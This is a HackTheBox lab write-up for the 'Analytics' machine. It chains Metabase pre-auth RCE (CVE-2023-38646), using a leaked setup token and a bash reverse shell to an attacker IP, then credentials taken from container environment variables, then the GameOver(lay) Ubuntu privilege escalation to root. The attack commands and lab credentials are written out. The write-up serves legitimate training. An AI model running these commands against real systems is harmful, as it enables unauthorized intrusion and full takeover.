## Reconnaissance

### nmap 

> First, scan the target 

```
nmap -sC -sV -oN analytics_light 10.10.11.233
```

![](./IMG/0.png)

### Web Service 

> Browse the target web service 

![](./IMG/1.png)

> The top page, only Login has reall link

![](./IMG/2.png)

> Try to access it, but the host can't be access correctly

![](./IMG/3.png)

> Edit /etc/hosts, add data.analytical.htb
> I don't have any credential for this site.
> But here is a forget password function

![](./IMG/4.png)
> Check this function, it doesn't have any help.
![](./IMG/7.png)
> Checking the home page in burp 

![](./IMG/5.png)
> Here is a interesting message which mention about credentials.
> Note it first. (But actually it is useless for this machine)

![](./IMG/6.png)
### Gobuster 

```
gobuster dir -u htp://analytics.htb -w /usr/share/wordlists/dirb/common.txt -o analytical.out
```


![](./IMG/52.png)

## Exploit 

> Trying to find exploit code for metabase without any knowledge for version 

```
searchsploit metabase 
```

![](./IMG/8.png)
> Searching by google

![](./IMG/9.png)
> Find a POC in github.
> The description also provide the usage and the necessary information for this POC.

- [(GITHUB)Metabase Pre-Auth RCE (CVE-2023-38646) POC](https://github.com/m3m0o/metabase-pre-auth-rce-poc)

1. setup-token

![](./IMG/10.png)
> So, I need to find out the setup-token.
> I checked the web source code in Home page and filter it by keyword: 'token'
> Here are 2 results.

![](./IMG/11.png)
> Got it. I found it in 2nd one.

![](./IMG/12.png)
> Execute the payload and check how to use
```
python main.py
```
![](./IMG/13.png)
> Then I execute an easy command 

```
python main.py -u http://data.analytical.htb -t <setup-token> -c 'whoami'
```

![](./IMG/14.png)
> The result show the Payload sent, but I can't view any result. 
> Back to the Github, if I directly send reverse shell, it might work.

![](./IMG/53.png)
> So, I tried the following command 

```
python main.py -u http://data.analytical.htb -t <setup-token> -c "bash -c 'bash -i >& /dev/tcp/10.10.16.59/1337 0>&1'"
```

![](./IMG/15.png)
> Get the reverse shell, but the host name is weird.
> it seems I just get the initial access in container.

![](./IMG/16.png)
> Check the current user 
```
whoami 
id
```

![](./IMG/17.png)
> Check the /etc/passwd to confirm the potential user
> With this result, I confirm there is a user which is my target - metabase

![](./IMG/18.png)
> I also confirm the host information 
```
uname -r
uname -a
```

![](./IMG/19.png)
> Then I move to the target user's (metabase) directory, 
> It's empty.

![](./IMG/20.png)
> But in this directory (/)
> I can really sure I'm in container.
> Here is a hidden directory - .dockerenv
> Besides that, the other interesting directory is metabase.db

![](./IMG/26.png)
> Actually, I start from search about 'how to escape from container' first,
> but with more search result and research, it's not a correct path.

> Checking metabase.db
> Here are 2 files 

1. metabase.db.mv.db
2. metabase.db.trace.db

![](./IMG/21.png)
> Check the content directly, it really is a big database file 
> It's not easy to find the clue in such a big file 

![](./IMG/22.png)
> Then I tried to only check the head of this file. 
> I still can't get anything.

![](./IMG/23.png)
> I tried to filter 'password' in this file 
> Ok, I got a long string, it might be the password for some user ... (I guess.)

```
cat metabase.db.mv.db | grep "password"
```
![](./IMG/24.png)
> I also check the other file.
> It only contain some trace message for database.
> I still can't find anything useful, but it's not a big file at least.

![](./IMG/25.png)

> So, I upload linpeas.sh and execute it.

![](./IMG/27.png)
> Here are some process record which they all  might caused by me. 
> Those command are executed by me few minutes ago.

![](./IMG/28.png)
> The result also show some unexpected files and directories in root 

![](./IMG/29.png)
> And some file which contain the word "password" or "credential"

![](./IMG/30.png)
> The environment variable list.
> Yes, that is the critical part in this time
> I finally find the Credential.

![](./IMG/31.png)
> Find a USER variable - metabase.
> I think it means the docker has a USER and it also is current user.

![](./IMG/32.png)
> Credentials 
```
metalytics / An4lytics_ds20223#
```

![](./IMG/33.png)

![](./IMG/34.png)
> I used above credential to login to the web service.
> It success, but after some enumeration, I still can't find anything useful in this page
![](./IMG/35.png)

## Privilege Escalation 

> Then I also tried to use same credential to login to SSH.
> It success, too.
> And it's not a container environment this time.

```
ssh metalytics@10.10.11.233
```
![](./IMG/36.png)
> After login, I checked the current user 
```
id
whoami
```

![](./IMG/37.png)
> Then I also check sudo permission list.
> As the result, it obviously said I can't run sudo with current user
```
sudo -l
```

![](./IMG/38.png)
> I also list the file which have the SUID permission set 
```
find / -perm -u=s 2>/dev/null
```

![](./IMG/39.png)
> I executed the linpeas again.

![](./IMG/40.png)
> Check environment variable again.
> But nothing interesting in this time.

![](./IMG/41.png)
> Check the crontab 

![](./IMG/42.png)
> Check the Network interface

![](./IMG/43.png)
> Check the active service 

![](./IMG/44.png)
> Find a ldap directory in /etc

![](./IMG/45.png)
> Get user flag

![](./IMG/46.png)
> Then I also check the OS information in this environment.
> Ok, I will record the information this time, since it's the clue about the vulnerability for this challenge
- Linux ubuntu 22.04.2

![](./IMG/47.png)
> Research and find exploit for this OS version 
- [Ubuntu Local Privilege Escalation (CVE-2023-2640 & CVE-2023-32629)](https://www.reddit.com/r/selfhosted/comments/15ecpck/ubuntu_local_privilege_escalation_cve20232640/?rdt=33924)

![](./IMG/54.png)
> I also find a POC in GITHUB

- [(GITHUB)GameOver(lay) Ubuntu Privilege Escalation](https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629)

![](./IMG/48.png)
> Provide execute permission for this shell
```
chmod +x shell.sh
```
> Execute it, yes, I think I'm root now

![](./IMG/49.png)
>Check the current user

```
id
whoami
```
![](./IMG/50.png)
> Get root flag

![](./IMG/51.png)

## Reference 

### Write up / Discussion 

- [(Write up)Analytics | HackTheBox Walkthrough](https://bishalrayy.medium.com/analytics-hackthebox-walkthrough-a9008b2e7a4e)
- [(Write up)HackTheBox : Analytics [Metabase RCE]](https://medium.com/@starlox.riju123/hackthebox-analytics-metabase-rce-bd3421cba76d)
- [(Discussion)Official Analytics Discussion](https://forum.hackthebox.com/t/official-analytics-discussion/299970)
### Metabase

- [(GITHUB)Metabase Pre-Auth RCE (CVE-2023-38646) POC](https://github.com/m3m0o/metabase-pre-auth-rce-poc)
- [(GITHUB)CVE-2023-38646 - Metabase Pre-auth RCE](https://github.com/shamo0/CVE-2023-38646-PoC)
- [CVE-2023–38646 — Metabase Pre-Auth RCE](https://infosecwriteups.com/cve-2023-38646-metabase-pre-auth-rce-866220684396)
- [Metabase 远程代码执行漏洞(CVE-2023-38646)](https://zhuanlan.zhihu.com/p/647355511)
- [CVE-2023-38646：Metabase远程命令执行漏洞](https://cloud.tencent.com/developer/article/2326776)
- [(NVD)CVE-2023-38646 Detail](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)
- [Metabase - Remote Code Execution (CVE-2023-38646)](https://pentest-tools.com/vulnerabilities-exploits/metabase-remote-code-execution_CVE-2023-38646)
### Privilege Escalation 

- [(GITHUB)GameOver(lay) Ubuntu Privilege Escalation](https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629)
- [Ubuntu Local Privilege Escalation (CVE-2023-2640 & CVE-2023-32629)](https://www.reddit.com/r/selfhosted/comments/15ecpck/ubuntu_local_privilege_escalation_cve20232640/?rdt=33924)
### Linux Command / Tools 

- [Linux 匹配文字 grep 指令用法教學與範例](https://blog.gtwang.org/linux/linux-grep-command-tutorial-examples/)
### Docker Escape 

- [(GITHUB)escaping-from-a-docker-container.md](https://github.com/carlospolop/hacktricks/blob/master/linux-unix/privilege-escalation/escaping-from-a-docker-container.md)
- [(HackTricks)Docker Breakout / Privilege Escalation](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation)
- [(HackTricks)Docker Security](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security)
- [Container Escape 101](https://teamt5.org/tw/posts/container-escape-101/)
- [7 Ways to Escape a Container](https://www.panoptica.app/research/7-ways-to-escape-a-container)
- [Container Escape: All You Need is Cap (Capabilities)](https://www.cybereason.com/blog/container-escape-all-you-need-is-cap-capabilities)
- [(ExploitNote)Docker Escape](https://exploit-notes.hdks.org/exploit/container/docker/docker-escape/)
###### tags: `HackTheBox`